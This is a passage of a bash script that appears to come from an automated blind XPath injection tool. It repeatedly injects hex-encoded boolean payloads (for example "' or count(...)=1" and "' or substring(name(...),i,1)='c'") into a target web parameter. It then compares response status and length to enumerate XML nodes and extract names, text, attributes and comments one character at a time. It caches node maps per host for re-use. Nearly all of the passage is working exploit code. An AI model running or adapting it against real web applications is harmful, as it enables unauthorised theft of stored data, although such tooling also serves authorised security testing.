	echo "Re-using the element hierachy file at ./output/$safelogname.$safehostname.xpath"
	cat ./output/$safelogname.$safehostname.xpath > ./finalshortlist.txt
else

###loop to grab the list of accessible nodes
attcount=1
xcount=1
ecount=1
maxxcount=15
obuff=""
mbuff=""
iteration=0
xcount=1
#((fcount=$fcount+1))
ycount=1
zcount=2
rm ./listofxpathelements.txt 2>/dev/null
rm ./shortlist.txt 2>/dev/null
rm ./extrashortlist.txt 2>/dev/null
rm ./extrashortlist2.txt 2>/dev/null

echo "Please wait - enumerating nodes..."

while [[ "$ycount" -le "$zcount" ]] ; do
	while [[ $ecount -le $fcount ]] ; do
		success=0
		xcount=1
			vbuff="%2f%2a%5b$xcount%5d"		
			xbuff="$obuff""$vbuff"
			#always false:                                            #count(/*[1])=0
			#echo "ecount: $ecount xcount: $xcount"            # $begin or count($xbuff)=0$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d0$end"`

			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`

		while [[ $xcount -le $maxxcount ]] ; do
			echo -n "."
			vbuff="%2f%2a%5b$xcount%5d"		
			xbuff="$obuff""$vbuff"
	
			rbuff="/*[$xcount]"
			ybuff="$mbuff""$rbuff"
			success=0

			#echo "ecount: $ecount xcount: $xcount"            # $begin or count($xbuff)=1$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`								
			((lendiff=$length_true-$length_false))
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				echo "$ybuff" >> ./shortlist.txt
				mynodecount=$xcount
				success=1 
				if [[ "$xcount" != "1" ]] ; then
					echo "$ybuff" >> ./extrashortlist.txt				
				fi
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then			
					echo "$ybuff" >> ./shortlist.txt				
					mynodecount=$xcount
					success=1
					if [[ "$xcount" != "1" ]] ; then
						echo "$ybuff" >> ./extrashortlist.txt				
					fi
				fi
			fi
			#nodetests
			((xcount=$xcount+1))
		done
		((ecount=$ecount+1))
		obuff="%2f%2a%5b%31%5d"$obuff
		mbuff="/*[1]"$mbuff
	done
((ycount=$ycount+1))
done

###second loop to grab the list of accessible nodes

attcount=1
xcount=1
ecount=1
fcount=4
maxxcount=15
obuff=""
mbuff=""
iteration=0
xcount=1
ycount=1
zcount=2


cat ./extrashortlist.txt 2>/dev/null | while read entry ; do
	###hex-encode the entries in the shortlist
	i=0
	input=$entry
	outbuf=''
	stringlength=${#input}
	((stringlengthminus1=$stringlength-1))
	while ((i<$stringlength)) ; do 
		char=`echo "${input:i:1}"`
		outbuf=$outbuf`echo -n "%"`
		outbuf=$outbuf`printf "%02x" "'$char'"`
		((i++))
	done 
	obuff=$outbuf
		xcount=1
			vbuff="%2f%2a%5b$xcount%5d"		
			xbuff="$obuff""$vbuff"
			#always false:                                            #count(/*[1])=0
			#echo "ecount: $ecount xcount: $xcount"            # $begin or count($xbuff)=0$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d0$end"`

			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`

		while [[ $xcount -le $maxxcount ]] ; do
			echo -n "."
			vbuff="%2f%2a%5b$xcount%5d"		
			xbuff="$obuff""$vbuff"
	
			rbuff="/*[$xcount]"
			ybuff="$entry""$rbuff"
			success=0

			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`								
				((lendiff=$length_true-$length_false))
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				echo "$ybuff" >> ./shortlist.txt
				mynodecount=$xcount
				echo -n "0"
				success=1 
				echo "$ybuff" >> ./extrashortlist2.txt				
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then			
					echo "$ybuff" >> ./shortlist.txt				
					mynodecount=$xcount
					echo -n "0"
					success=1
					echo "$ybuff" >> ./extrashortlist2.txt				
				fi
			fi
			#nodetests
			((xcount=$xcount+1))
		done
		((ecount=$ecount+1))
		obuff="%2f%2a%5b%31%5d"$obuff
		mbuff="/*[1]"$mbuff
done

###third loop to grab the list of accessible nodes

#rm ./extrashortlist2.txt 2>/dev/null
attcount=1
xcount=1
ecount=1
fcount=4
maxxcount=15
obuff=""
mbuff=""
iteration=0
xcount=1
#((fcount=$fcount+1))
ycount=1
zcount=2
#echo "extrashortlist2"
#cat ./extrashortlist2.txt 2>/dev/null
#echo "done"


cat ./extrashortlist2.txt 2>/dev/null | while read entry ; do
	###hex-encode the entries in the shortlist
	i=0
	input=$entry
	outbuf=''
	stringlength=${#input}
	((stringlengthminus1=$stringlength-1))
	while ((i<$stringlength)) ; do 
		char=`echo "${input:i:1}"`
		outbuf=$outbuf`echo -n "%"`
		outbuf=$outbuf`printf "%02x" "'$char'"`
		((i++))
	done 
	obuff=$outbuf
		xcount=1
			vbuff="%2f%2a%5b$xcount%5d"		
			xbuff="$obuff""$vbuff"
			#always false:                                            #count(/*[1])=0
			#echo "ecount: $ecount xcount: $xcount"            # $begin or count($xbuff)=0$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d0$end"`

			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`

		while [[ $xcount -le $maxxcount ]] ; do
			echo -n "."
			vbuff="%2f%2a%5b$xcount%5d"		
			xbuff="$obuff""$vbuff"
	
			rbuff="/*[$xcount]"
			ybuff="$entry""$rbuff"
			success=0

			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`								
				((lendiff=$length_true-$length_false))
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				echo "$ybuff" >> ./shortlist.txt
				mynodecount=$xcount
				echo -n "0"
				success=1 
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then			
					echo "$ybuff" >> ./shortlist.txt				
					mynodecount=$xcount
					echo -n "0"
					success=1
				fi
			fi
			#nodetests
			((xcount=$xcount+1))
		done
		((ecount=$ecount+1))
		obuff="%2f%2a%5b%31%5d"$obuff
		mbuff="/*[1]"$mbuff
done

cat ./shortlist.txt | sort | uniq > ./finalshortlist.txt				

echo ""
echo "Saving enumerated node map to ./output/$safelogname.$safehostname.xpath - this will be available for re-use in later scans of the same host"
cat ./finalshortlist.txt > ./output/$safelogname.$safehostname.xpath 
###end of enumeration if statement
fi

echo "Nodes enumerated:"

cat ./finalshortlist.txt

echo "Extracting data from enumerated nodes..."
echo ""
			
###

attcount=1
xcount=1
ecount=1
maxxcount=15
obuff=""
mbuff=""
iteration=0
xcount=1
ycount=1
zcount=2

cat ./finalshortlist.txt | while read entry ; do
	###hex-encode the entries in the shortlist
	i=0
	input=$entry
	outbuf=''
	stringlength=${#input}
	((stringlengthminus1=$stringlength-1))
	while ((i<$stringlength)) ; do 
		char=`echo "${input:i:1}"`
		outbuf=$outbuf`echo -n "%"`
		outbuf=$outbuf`printf "%02x" "'$char'"`
		((i++))
	done 
	#init some params
	obuff=$outbuf
	success=1
	stringextract=0
	stringlength=1
	echo -n "$entry "
	echo -n "$entry " >> ./listofxpathelements.txt
	nodetests
done

}

nodetests()
{
#test for the node
if [[ "$success" == "1" ]] ; then
	# now we get the length of the name of the node
	if [[ "$stringlength" == "1" ]] ; then
		hcount=1
		length=0
		#always false:                                           
		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%29%29%3d0$end"`
		requester
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2`

		while [[ $hcount -le $maxxcount ]] ; do
			
			#$begin or string-length(name($obuff))=$hcount$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%29%29%3d$hcount$end"`
			#echo "bp: $badparams"			
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`
			((lendiff=$length_true-$length_false))
			#echo "lendiff: $lendiff"
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				((length=$hcount))								
				hcount=$maxxcount
				if [[ length != "0" ]] ; then
					stringextract=1
				fi
					#echo "length: $length"
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then			
					((length=$hcount))
					hcount=$maxxcount
					if [[ length != "0" ]] ; then
						stringextract=1
					fi
						#echo "length: $length"
				fi
			fi
	 		((hcount=$hcount+1))
		done			
	fi
	# now we get the name of the node
	if [[ "$stringextract" == "1" ]] ; then
		icount=1
		#always false:                                           
		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%29%2c0%2c%31%29%3d%27a%27$end"`
		requester
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2`

		while [[ $icount -le $length ]] ; do
			for char in `cat ./payloads/alphabet.txt` ; do
				#$begin or substring(name($obuff),$icount,1)='$char'$end	
				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
				requester
				status_true=`echo $response | cut -d ":" -f 1`
				length_true=`echo $response | cut -d ":" -f 2`
				((lendiff=$length_true-$length_false))
				#echo "namelendiff: $lendiff"
				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $icount = 1 ]] ; then
						echo -n "Name: "
						echo -n "Name: " >> ./listofxpathelements.txt
					fi
					echo -n "$char"
					echo -n "$char" >> ./listofxpathelements.txt
					break
				fi
				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $lendiff == $storedlendiff ]] ; then			
						if [[ $icount = 1 ]] ; then
							echo -n "Name: "
							echo -n "Name: " >> ./listofxpathelements.txt
						fi
						echo -n "$char"
						echo -n "$char" >> ./listofxpathelements.txt
						break
					fi
				fi
			done
			((icount=$icount+1))
		done
		echo -n " "
		echo -n " " >> ./listofxpathelements.txt
		
	fi
	attributenodetests
	#now we get the length of the content of the node:
	if [[ "$stringlength" == "1" ]] ; then
		hcount=1
		#always false:                                           
		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%74%65%78%74%28%29%29%3d0$end"`	
		requester
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2`
		while [[ $hcount -le $maxxcount ]] ; do
			#$begin or string-length($obuff/text())=$hcount$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%74%65%78%74%28%29%29%3d$hcount$end"`			
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`
			((lendiff=$length_true-$length_false))
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				((length=$hcount))								
				hcount=$maxxcount
				stringextract=1
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then			
					((length=$hcount))
					hcount=$maxxcount
					stringextract=1
				fi
			fi
	 		((hcount=$hcount+1))
		done			
	fi
	#now we get the content of the node:
	if [[ "$stringextract" == "1" ]] ; then
		icount=1
		while [[ $icount -le $length ]] ; do
		#always false:                                           
		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c0%2c%31%29%3d%27a%27$end"`
		requester
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2`			
			for char in `cat ./payloads/alphabet.txt` ; do
				#$begin or substring($obuff/text(),$icount,1)='$char'$end
				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
				requester
				status_true=`echo $response | cut -d ":" -f 1`
				length_true=`echo $response | cut -d ":" -f 2`
				((lendiff=$length_true-$length_false))
				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $icount = 1 ]] ; then
						echo -n "Content: "
						echo -n "Content: " >> ./listofxpathelements.txt 
					fi
					echo -n "$char"
					echo -n "$char" >> ./listofxpathelements.txt 
					break
				fi
				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $lendiff == $storedlendiff ]] ; then			
						if [[ $icount = 1 ]] ; then
							echo -n "Content: " 
							echo -n "Content: " >> ./listofxpathelements.txt 
						fi
						echo -n "$char"
						echo -n "$char" >> ./listofxpathelements.txt 						
						break
					fi
				fi
			done
		((icount=$icount+1))
		done
	commentnodetests
	echo ""
	echo "" >> ./listofxpathelements.txt								 			
	fi
((gcount=$gcount+1))
stringlength=0
stringextract=0
fi
}

attributenodetests()
{
attstringlength=0
attstringextract=0
maxxcount=15
bnumberofattributes=0
#test for attribute node with /@*
attgcount=1
while [[ $attgcount -le $maxxcount ]] ; do
	#always false:                                           
	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%40%2a%29%3d0$end"`
	requester
	status_false=`echo $response | cut -d ":" -f 1`
	length_false=`echo $response | cut -d ":" -f 2`

							    #$begin or count($obuff/@*)=$attgcount$end
	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%40%2a%29%3d$attgcount$end"`
	requester
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		attstringlength=1
		bnumberofattributes=$attgcount
		attgcount=$maxxcount
	fi
	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
		if [[ $lendiff == $storedlendiff ]] ; then			
			bnumberofattributes=$attgcount
			attstringlength=1
			attgcount=$maxxcount
		fi
	fi
	battcount=1
	#for each attribute discovered we need to determine the length of the attribute name and the letters in the attribute name
	while [[ "$battcount" -le "$bnumberofattributes" ]] ; do
	###beginning of attribute string length and extraction loop##
		if [[ "$attstringlength" == "1" ]] ; then
			atthcount=1
			#always false:                                           
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%29%3d0$end"`
			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`
			while [[ $atthcount -le $maxxcount ]] ; do
										    #$begin or string-length(name($obuff/@*[$battcount]))=$atthcount$end
				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%29%3d$atthcount$end"`			
				requester
				status_true=`echo $response | cut -d ":" -f 1`
				length_true=`echo $response | cut -d ":" -f 2`

				((lendiff=$length_true-$length_false))
				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
					((length=$atthcount))								
					hcount=$maxxcount
					attstringextract=1
					#echo -n "length $length"
				fi
				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $lendiff == $storedlendiff ]] ; then			
						((length=$atthcount))
						hcount=$maxxcount
						#echo -n "length $length"
						attstringextract=1
					fi
				fi
		 		((atthcount=$atthcount+1))
			done			
		fi
		# now we get the name of the attribute
		if [[ "$attstringextract" == "1" ]] ; then
			echo -n ' '
			echo -n " " >> ./listofxpathelements.txt
			atticount=1
			#always false:                                           
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%2c0%2c%31%29%3d%27a%27$end"`
			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`
			while [[ $atticount -le $length ]] ; do
				for char in `cat ./payloads/alphabet.txt` ; do
					#$begin or substring(name($obuff/@*[$battcount]),$atticount,1)='$char'$end
					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%2c$atticount%2c%31%29%3d%27$char%27$end"`			
					requester
					status_true=`echo $response | cut -d ":" -f 1`
					length_true=`echo $response | cut -d ":" -f 2`
					((lendiff=$length_true-$length_false))
					if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
						echo -n "$char"
						echo -n "$char" >> ./listofxpathelements.txt
						break
					fi
					if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
						if [[ $lendiff == $storedlendiff ]] ; then			
							echo -n "$char"
							echo -n "$char" >> ./listofxpathelements.txt
							break
						fi
					fi
				done
			((atticount=$atticount+1))
			done			
		fi
		#now we get the length of the content of the attribute:
		if [[ "$attstringlength" == "1" ]] ; then
			ahcount=1
			#always false:                                           
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%40%2a%5b$battcount%5d%29%3d0$end"`
			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`	
			while [[ $ahcount -le $maxxcount ]] ; do
				#$begin or string-length($obuff/@*[$battcount])=$ahcount$end			
				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%40%2a%5b$battcount%5d%29%3d$ahcount$end"`			
				requester
				status_true=`echo $response | cut -d ":" -f 1`
				length_true=`echo $response | cut -d ":" -f 2`
				((lendiff=$length_true-$length_false))
				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
					((length=$ahcount))								
					ahcount=$maxxcount
					attstringextract=1
				fi
				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
					if [[ $lendiff == $storedlendiff ]] ; then			
						((length=$ahcount))
						ahcount=$maxxcount
						attstringextract=1
					fi
				fi
		 		((ahcount=$ahcount+1))
			done			
		fi
		#now we get the content of the attribute:
		if [[ "$attstringextract" == "1" ]] ; then
		echo -n '="'
		echo -n '="' >> ./listofxpathelements.txt
			#stringextract=0
			bicount=1
			#always false:                                           
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c0%2c%31%29%3d%27a%27$end"`
			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`
			while [[ $bicount -le $length ]] ; do
				for char in `cat ./payloads/alphabet.txt` ; do
					#$begin or substring($obuff/@*[$battcount],$bicount,1)='$char'$end
					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c$bicount%2c%31%29%3d%27$char%27$end"`			
					requester
					status_true=`echo $response | cut -d ":" -f 1`
					length_true=`echo $response | cut -d ":" -f 2`
					((lendiff=$length_true-$length_false))
					if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
						echo -n "$char"
						echo -n "$char" >> ./listofxpathelements.txt
						break
					fi
					if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
						if [[ $lendiff == $storedlendiff ]] ; then			
							echo -n "$char"
							echo -n "$char" >> ./listofxpathelements.txt
							break
						fi
					fi
				done
				((bicount=$bicount+1))
			done
			if [[ $battcount -lt $bnumberofattributes ]] ; then
				echo -n '"'
				echo -n '"' >> ./listofxpathelements.txt
			elif [[ $battcount == $bnumberofattributes ]] ; then
				echo -n '"'
				echo -n '"' >> ./listofxpathelements.txt
			fi			
		fi
		((battcount=$battcount+1))					
		done
	#if [[ $attgcount == $bnumberofattributes ]] ; then
	#	break
	#fi
	attstringlength=0
	attstringextract=0
	((attgcount=$attgcount+1))
done
}

commentnodetests()
{
#test for comment node with /comment()
stringextract=0
stringlength=0		
egcount=1
maxcom=50
#always false:                                           
badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d0$end"`
requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`
		
						    #$begin or count($obuff/comment())=$egcount$end
badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$egcount$end"`
requester
status_true=`echo $response | cut -d ":" -f 1`
length_true=`echo $response | cut -d ":" -f 2`
((lendiff=$length_true-$length_false))
if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
	stringlength=1
fi
if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
	if [[ $lendiff == $storedlendiff ]] ; then			
		stringlength=1
	fi
fi
#now we get the length of the content of the comment:
if [[ "$stringlength" == "1" ]] ; then
	comhcount=1
	while [[ $comhcount -le $maxcom ]] ; do
		#always false:                                           
		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d0$end"`
		requester
		status_false=`echo $response | cut -d ":" -f 1`
		length_false=`echo $response | cut -d ":" -f 2`
	
		#$begin or string-length($obuff/comment())=$comhcount$end		
		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$comhcount$end"`		
		#echo $badparams				
		requester
		status_true=`echo $response | cut -d ":" -f 1`
		length_true=`echo $response | cut -d ":" -f 2`
		((lendiff=$length_true-$length_false))
		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
			((comlen=$comhcount))								
			comhcount=$maxcom
			stringextract=1
		fi
		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
			if [[ $lendiff == $storedlendiff ]] ; then			
				((comlen=$comhcount))
				comhcount=$maxcom
				stringextract=1
			fi
		fi
 		((comhcount=$comhcount+1))
	done			
fi
#now we get the content of the comment:
if [[ "$stringextract" == "1" ]] ; then
	#echo "length: $length"
	comicount=1
	while [[ "$comicount" -le "$comlen" ]] ; do
		for char in `cat ./payloads/alphabet.txt` ; do
			#always false:                                           
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c0%2c%31%29%3d%27a%27$end"`			
			requester
			status_false=`echo $response | cut -d ":" -f 1`
			length_false=`echo $response | cut -d ":" -f 2`

			#$begin or substring($obuff/comment(),$comicount,1)='$char'$end
			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c$comicount%2c%31%29%3d%27$char%27$end"`			
			#echo $badparams
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`
			((lendiff=$length_true-$length_false))
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $comicount == 1 ]] ; then
					echo -n "Comment: "
					echo -n "Comment: " >> ./listofxpathelements.txt	
					
				fi
				echo -n "$char"
				echo -n "$char" >> ./listofxpathelements.txt	
				break
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then			
					if [[ $comicount == 1 ]] ; then
						echo -n "Comment: "
						echo -n "Comment: " >> ./listofxpathelements.txt	
					fi
					echo -n "$char"
					echo -n "$char" >> ./listofxpathelements.txt	
					break
				fi
			fi
		done
	((comicount=$comicount+1))
	done
fi			
#thats it for comment nodes		
}


xpathdatachecklength()
#unused - marked for removal
{
rm ./listofextractablexpathelements.txt 2>/dev/null
cat ./listofxpathelements.txt 2>/dev/null | while read entry ; do
	i=0
	input=$entry
	outbuf=''
	stringlength=${#input}
	((stringlengthminus1=$stringlength-1))
	while ((i<$stringlength)) ; do 
		char=`echo "${input:i:1}"`
		outbuf=$outbuf`echo -n "%"`
		outbuf=$outbuf`printf "%02x" "'$char'"`
		((i++))
	done 
	#						     #' or string-length($entry/text())>1 or 'a'='b
	badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$outbuf%2f%74%65%78%74%28%29%29%3e%31%20%6f%72%20%27%61%27%3d%27%62"`
	requester
	status_true=`echo $response | cut -d ":" -f 1`
	length_true=`echo $response | cut -d ":" -f 2`
	#echo "status_true: $status_true length_true: $length_true"
	#echo "status_false: $status_false length_false: $length_false"
	((lendiff=$length_true-$length_false))
	if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
		echo "$entry" >> ./listofextractablexpathelements.txt
	fi
	if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
		if [[ $lendiff == $storedlendiff ]] ; then			
			echo "$entry" >> ./listofextractablexpathelements.txt
		fi
	fi
done
#echo "list:"
#cat ./listofextractablexpathelements.txt
}

xpathdataextraction()
#unused - marked for removal
{
echo "Commencing data extraction."

#always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`

requester
status_false=`echo $response | cut -d ":" -f 1`
length_false=`echo $response | cut -d ":" -f 2`


ebuf=''
jflag=1
max_textlength=10
cat ./listofxpathelements.txt 2>/dev/null | while read ybuff ; do
	weflag=0
	#echo "$ybuff "
	i=0
	input=$ybuff
	outbuf=''
	stringlength=${#input}
	((stringlengthminus1=$stringlength-1))
	while ((i<$stringlength)) ; do 
		char=`echo "${input:i:1}"`
		outbuf=$outbuf`echo -n "%"`
		outbuf=$outbuf`printf "%02x" "'$char'"`
		((i++))
	done 
	echo -n "$ybuff "
	#echo "$outbuf"
	#echo "ybuff $ybuff"
	jflag=1
	while [[ $jflag -le $max_textlength ]] ; do
		for ipo in `cat ./payloads/alphabet.txt` ; do
			#echo "ipo: $ipo ybuff: $ybuff jflag: $jflag"        #'+or+substring(/*[1]/*[1]/*[1]/*[2]/text(),1,1)='1'+or+'a'='b&submit=Inject!
			#always true:                                       #' or substring($ybuff/text(),$jflag,1)='$ipo' or 'a'='b          
			#echo -n "."			
			badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$outbuf%2f%74%65%78%74%28%29%2c$jflag%2c%31%29%3d%27$ipo%27%20%6f%72%20%27%61%27%3d%27%62"`
			requester
			status_true=`echo $response | cut -d ":" -f 1`
			length_true=`echo $response | cut -d ":" -f 2`
			#echo "status_true: $status_true length_true: $length_true"
			#echo "status_false: $status_false length_false: $length_false"
			((lendiff=$length_true-$length_false))
			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $weflag == "0" ]] ; then 
					#echo -n "$ybuff "
					weflag=1
				fi
				echo -n "$ipo"
				ebuf=$ebuf$ipo
			fi
			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
				if [[ $lendiff == $storedlendiff ]] ; then
					if [[ $weflag == "0" ]] ; then 
						#echo -n "$ybuff "
						weflag=1
					fi
					echo -n "$ipo"
					ebuf=$ebuf$ipo
				fi
			fi
		done
	#echo "$ebuf" 
	((jflag=$jflag+1))
	#echo "$jflag"
	done
echo ""
echo $ybuff$ebuf >> ./listofxpathdata.txt
done	
}


xpathnodenameextract()
#unused - marked for removal
{
rm ./listofxpathnodes.txt 2>/dev/null
echo "Attempting to extract node names using xpath injection."
#always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
